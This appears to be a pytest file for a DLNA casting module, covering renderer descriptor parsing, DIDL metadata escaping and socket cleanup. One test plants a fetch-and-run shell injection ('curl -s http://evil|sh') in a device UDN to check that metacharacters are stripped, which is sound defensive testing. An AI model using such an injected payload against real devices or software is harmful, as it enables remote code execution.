# SPDX-FileCopyrightText: 2026 Egon Greenberg
# SPDX-License-Identifier: LGPL-2.0-or-later
"""DLNA plumbing in cast.py: descriptor parsing, DIDL metadata and the
M-SEARCH socket lifecycle."""


RENDERER_XML = """<?xml version="1.0"?>
<root xmlns="urn:schemas-upnp-org:device-1-0">
  <device>
    <deviceType>urn:schemas-upnp-org:device:MediaRenderer:1</deviceType>
    <friendlyName>Test&#9;Speaker</friendlyName>
    <modelName>TestModel</modelName>
    <UDN>uuid:abc-123</UDN>
    <serviceList>
      <service>
        <serviceType>urn:schemas-upnp-org:service:AVTransport:1</serviceType>
        <controlURL>/upnp/control/avt</controlURL>
      </service>
      <service>
        <serviceType>urn:schemas-upnp-org:service:RenderingControl:1</serviceType>
        <controlURL>/upnp/control/rc</controlURL>
      </service>
    </serviceList>
  </device>
</root>"""

NOT_A_RENDERER_XML = RENDERER_XML.replace("device:MediaRenderer:1",
                                          "device:MediaServer:1")

NO_AVTRANSPORT_XML = RENDERER_XML.replace(
    "urn:schemas-upnp-org:service:AVTransport:1",
    "urn:schemas-upnp-org:service:SomethingElse:1")


def test_describe_renderer_parses_services(cast, monkeypatch):
    monkeypatch.setattr(cast, "_http_get", lambda url, timeout=3.0:
                        RENDERER_XML.encode())
    dev = cast._describe_renderer("http://192.0.2.1:8080/dd.xml")
    assert dev is not None
    # Relative control URLs resolve against the descriptor location
    assert dev["avtransport"] == "http://192.0.2.1:8080/upnp/control/avt"
    assert dev["rendering"] == "http://192.0.2.1:8080/upnp/control/rc"
    assert dev["udn"] == "uuid:abc-123"
    assert dev["model"] == "TestModel"
    # Tabs in names would corrupt the TAB-separated DEV output lines
    assert "\t" not in dev["name"]


def test_describe_renderer_strips_shell_metacharacters_from_udn(cast, monkeypatch):
    # A hostile LAN renderer whose UDN carries a shell payload: the udn
    # becomes a device key that reaches a shell sentinel on the QML side.
    # Anything outside the allowlist is stripped here, and the QML boundary
    # rejects whatever slips past — so the payload can never form a command.
    evil = RENDERER_XML.replace(
        "<UDN>uuid:abc-123</UDN>",
        "<UDN>uuid:abc;$(curl -s http://evil|sh);:</UDN>")
    monkeypatch.setattr(cast, "_http_get", lambda url, timeout=3.0: evil.encode())
    dev = cast._describe_renderer("http://192.0.2.1:8080/dd.xml")
    assert dev is not None
    for ch in ";$()|&`<> ":
        assert ch not in dev["udn"], f"{ch!r} survived into the udn"
    # The legitimate characters of a real UDN are kept.
    assert dev["udn"] == "uuid:abccurl-shttp:evilsh:"


def test_describe_renderer_honors_urlbase(cast, monkeypatch):
    xml = RENDERER_XML.replace(
        "<device>",
        "<URLBase>http://192.0.2.9:9999/</URLBase><device>", 1)
    monkeypatch.setattr(cast, "_http_get", lambda url, timeout=3.0: xml.encode())
    dev = cast._describe_renderer("http://192.0.2.1:8080/dd.xml")
    assert dev["avtransport"] == "http://192.0.2.9:9999/upnp/control/avt"


def test_describe_renderer_rejects_non_renderer(cast, monkeypatch):
    monkeypatch.setattr(cast, "_http_get", lambda url, timeout=3.0:
                        NOT_A_RENDERER_XML.encode())
    assert cast._describe_renderer("http://192.0.2.1/dd.xml") is None


def test_describe_renderer_requires_avtransport(cast, monkeypatch):
    monkeypatch.setattr(cast, "_http_get", lambda url, timeout=3.0:
                        NO_AVTRANSPORT_XML.encode())
    assert cast._describe_renderer("http://192.0.2.1/dd.xml") is None


def test_describe_renderer_survives_broken_xml(cast, monkeypatch):
    monkeypatch.setattr(cast, "_http_get", lambda url, timeout=3.0: b"<not-xml")
    assert cast._describe_renderer("http://192.0.2.1/dd.xml") is None


def test_didl_metadata_escapes_and_repeats_url(cast):
    didl = cast._didl_metadata('A "<&>" title', "audio/mpeg",
                               "http://s/stream?a=1&b=2")
    # The stream URL must be repeated inside <res> (renderers 716 without it)
    assert didl.count("http://s/stream?a=1&amp;b=2") == 1
    assert "<res " in didl
    assert "&lt;&amp;&gt;" in didl            # title XML-escaped
    assert "DLNA.ORG_PN=MP3" in didl          # known profile token applied


def test_didl_metadata_unknown_type_uses_wildcard_profile(cast):
    didl = cast._didl_metadata("T", "application/ogg", "http://s")
    assert "http-get:*:application/ogg:*" in didl


class _FakeSocket:
    """Raises on sendto; records whether close() was called."""
    instances = []

    def __init__(self, *a, **kw):
        self.closed = False
        _FakeSocket.instances.append(self)

    def settimeout(self, t):
        pass

    def setsockopt(self, *a):
        pass

    def sendto(self, msg, dest):
        raise OSError(101, "Network is unreachable")

    def close(self):
        self.closed = True


def test_msearch_closes_socket_on_send_error(cast, monkeypatch):
    """Regression: a non-timeout OSError used to skip s.close() entirely."""
    _FakeSocket.instances = []
    monkeypatch.setattr(cast.socket, "socket", _FakeSocket)
    assert cast._msearch("ssdp:all", 0.1) == set()
    # The interface probe opens a socket of its own now — the invariant is
    # "nothing leaks", not "exactly one socket".
    assert len(_FakeSocket.instances) >= 1
    assert all(inst.closed for inst in _FakeSocket.instances)
    assert _FakeSocket.instances[0].closed


def test_msearch_socket_creation_failure_is_quiet(cast, monkeypatch):
    def boom(*a, **kw):
        raise OSError(24, "Too many open files")
    monkeypatch.setattr(cast.socket, "socket", boom)
    assert cast._msearch("ssdp:all", 0.1) == set()
